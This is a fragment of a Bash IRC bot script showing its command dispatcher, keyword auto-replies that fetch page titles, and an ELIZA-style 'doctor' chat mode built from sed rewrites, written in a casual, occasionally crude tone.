      [ ! "$2" ] && message_post $CHANNEL "Explode requires a URL dumbass" && return
      URL=$(CURL_BIN -I -s "$2" | $GREP_BIN -f 'Location:' | $CUT_BIN -d" " -f2)
      message_post $CHANNEL "Exploded url: $URL "
    elif [ "${1:2}" == "keywords" ]; then
      message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"
    elif [ "${1:2}" == "keyword" ]; then
      shift
      run_keyword $SENDER $CHANNEL $*
    elif [ "${1:2}" == "silly" ]; then
      shift
      run_randsentence $SENDER $CHANNEL $*
    elif [ "${1:2}" == "ticker" ]; then
      shift
      run_ticker $SENDER $CHANNEL $*
    elif [ "${1:2}" == "controller" ]; then
      shift
      run_controller $SENDER $CHANNEL $*
    elif [ "${1:2}" == "shorten" ]; then
      shift
      run_shorten $SENDER $CHANNEL $*
    elif [ "${1:2}" == "join" ]; then
      shift
      run_join $SENDER $CHANNEL $*
    elif [ "${1:2}" == "weather" ]; then
      shift
      run_weather $SENDER $CHANNEL $*
    elif [ "${1:2}" == "oper" ]; then
      shift
      run_op $SENDER $CHANNEL $*
    elif [ "${1:2}" == "deop" ]; then
      shift
      run_deop $SENDER $CHANNEL $*
    elif [ "${1:2}" == "insult" ]; then
      shift
      run_insult $SENDER $CHANNEL $*
    elif [ "${1:2}" == "compile" ]; then
      shift
      run_compile $SENDER $CHANNEL $*
    elif [ "${1:2}" == "rot13" ]; then
      shift
      run_rot13 $SENDER $CHANNEL "$*"
    elif [ "${1:2}" == "exploitdb" ]; then
      shift
      run_exploit_search $SENDER $CHANNEL "$*"
    elif [ "${1:2}" == "doctor" ]; then
      [ ! "${2}" ] && message_post $CHANNEL "Doctor is ${DRBOT}" && return
      authenticated $SENDER $CHANNEL RESULT
      [ ${RESULT} -eq 0 ] && message_post $CHANNEL "Sorry, $SENDER, but you can't change this doctor" && return
      [ "${2}" == "on" ] && DRBOT="on" && message_post $CHANNEL "Dr - $DRBOT" && return
      [ "${2}" == "off" ] && DRBOT="off" && message_post $CHANNEL "Dr - $DRBOT" && return
      message_post $CHANNEL "I only understand on/off"
    elif [ "${1:2}" == "help" ]; then
      message_post $CHANNEL "I understand any of [uptime|explode|keywords|keyword|controller|shorten|join|part|compile|rot13|doctor|quit]"
    elif [ "${1:2}" == "part" ]; then
      shift
      run_part $SENDER $CHANNEL $CHANNEL
    elif [ "${1:2}" == "facebook" ]; then
      shift
      message_post $CHANNEL "Facebook: because even when you're taking a crap, you need ignorant political discussion"
    elif [ "${1:2}" == "google" ]; then
      shift
      run_google $SENDER $CHANNEL $@
    elif [ "${1:2}" == "quit" ]; then
      shift
      run_quit $SENDER $CHANNEL "$*"
    fi

    return
  fi

  if [ "${USE_KEYWORDS}" == "1" ]; then
      I=0
      for found in "${KEYWORDS[@]}"; do
        result=$(echo "$*" | $GREP_BIN -i "$found")
        if [ "${result}" ]; then
            RESPONSE="${KEYWORD_RESPONSES[${I}]}"
            SEDLINE="s/%SENDER%/${SENDER}/g"
            FORMATTED_RSP=$(echo "$RESPONSE" | $SED_BIN $SEDLINE)
  
            check_title=$(echo "$FORMATTED_RSP" | $GREP_BIN "%URL_TITLE%")
            if [ "$check_title" ]; then
               HTTP_TEXT=$(run_resolve "$*")
               TITLE=$(echo "${HTTP_TEXT}" | $GREP_BIN -o "<title>.*</title>" | $SED_BIN "s@<title>@@g" | $SED_BIN "s@</title>@@g" )
               debug "$SENDER asked for $TITLE from $*"
               if [ "$TITLE" ]; then
                  SEDLINE="s@%URL_TITLE%@$TITLE@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")
               else
                  SEDLINE="s@%URL_TITLE%@(No Title)@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")
               fi
            fi

            message_post $CHANNEL "${FORMATTED_RSP}"
            return
        fi
        (( I=$I+1 ))
      done
  fi

  if [ "$DRBOT" == "on" ]; then
    SAID_COMMA_IRCBOT=$(echo "$*" | $GREP_BIN -o -i ,\ ircbot)
    if [ "$1" == ":${nick}" -o "$1" == ":$nick:" -o "$1" == ":$nick," -o "$SAID_COMMA_IRCBOT" ]; then
      shift
      INPUTLINE=$(echo "$*" | $TR_BIN "[a-z]" "[A-Z]" | $SED_BIN 's/^/ /; s/,/ /g; s/$/ /; s/\./ /g; s/ I / i /g; s/ I.M / i am /g; s/ YOU ARE/ you are/g; s/ AM / am /g; s/ ME / me /g; s/ YOU / you /g; s/ MY / my /g; s/ YOUR / your /g; s/ MINE / mine /g; s/ ARE / are /g; s/ me / YOU /g; s/ my / YOUR /g; s/ your / IRCBOTS /g; s/ i / YOU /g; s/ am / ARE /g;s/ mine / YOURS /g; s/ are / IS /; s/ you / IRCBOT /; s/^ //; s/ $//')
      #message_post $SENDER $INPUTLINE
      case "$INPUTLINE" in
        *YOU\ ARE\ *)
            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ ARE/WHY DO YOU THINK YOU ARE/')
            ;;
        *YOU\ HAVE\ *)
            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ HAVE/HOW LONG HAVE YOU HAD/')
            ;;
        YOU\ REALIZED*|WHEN\ *|*WHEN\ *|*YOU\ REALIZED*|*MOMENT\ AGO*|*MOMENT\ AGO)
            INPUTLINE=$(echo "${INPUTLINE}" | $SED_BIN 's/YOU REALIZED//g')
            INPUTLINE="interesting. did anything else happen ${INPUTLINE}?"
            ;;
        WHY\ DOES*|WHY\ DO*)
            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^WHY\ \(DO\|DOES\) //')
            INPUTLINE="why do you think that $INPUTLINE"
            ;;
        YOU*)
            INPUTLINE="when did you first realize that ${INPUTLINE}?"
            ;;
        *BECAUSE*)
            STATEMENT=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*BECAUSE //')
            INPUTLINE="are you sure ${STATEMENT}"
            ;;
        *DO\ IRCBOT\ THINK*)
            INPUTLINE="can't you answer that yourself?"
            ;;
        *IRCBOTS*)
            INPUTLINE="let's keep the conversation on something else please"
            ;;
        *TOUCHY*|*TESTY*|*ANGRY*|*MAD*|*HAPPY*|*SAD*|*EXCITED*)
            INPUTLINE="I have no emotions. That said, why have you interpreted my statement as such?"
            ;;
        *IRCBOT\ IS*|IRCBOT\ IS*)
            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN 's/^.*IRCBOT IS //')
            INPUTLINE="I do not think I am $STATEMENT"
            ;;
        *ARE\ IRCBOT*|*IS\ IRCBOT*|ARE\ IRCBOT*|IS\ IRCBOT*)
            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(ARE\|IS\) IRCBOT //")
            INPUTLINE="do you think I am ${STATEMENT}?"
            ;;
        *IS\ *\'S*|*DOES\ *\'S*|IS\ *\'S*|DOES\ *\'S*)
            PERSON=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(DOES\|IS\) \(.*'S\) \(.*\)/\2/" | $CUT_BIN -d"'" -f1)
            INPUTLINE="you should ask $PERSON"
            ;;
        IS\ AWESOME|IS\ GOOD|IS\ GREAT)
            INPUTLINE="thank you"
            ;;
        IS\ AWESOME\ AT*|IS\ GOOD\ AT*|IS\ GREAT\ AT*|IS\ *)
            INPUTLINE="i am not sure about that"
            ;;
        SUCKS\ AT*|STINKS\ AT*)
            INPUTLINE="i have no doubt this is correct"
            ;;
        IRCBOT\ SUCKS|IRCBOT\ SUCKS*|*IRCBOT\ SUCKS*|*IRCBOT\ SUCKS|SUCKS*)
            INPUTLINE="and you are a ray of sunshine?"
            ;;
        YES*)
            INPUTLINE="why do you think this is so?"
            ;;
        NO*)
            INPUTLINE="Why are you being negative?"
            ;;
          *)
            INPUTLINE="Why do you say ${INPUTLINE}?"
            ;;
      esac
      SEDLINE="s/ircbot/${nick}/g"
      INPUTLINE=$(echo "$INPUTLINE" | $TR_BIN "[A-Z]" "[a-z]" | $SED_BIN $SEDLINE | $SED_BIN 's/yourself/klarself/g' | $SED_BIN 's/myself/yourself/g' | $SED_BIN 's/klarself/myself/g' )
      message_post $CHANNEL "$SENDER, $INPUTLINE"
    fi
  fi
}
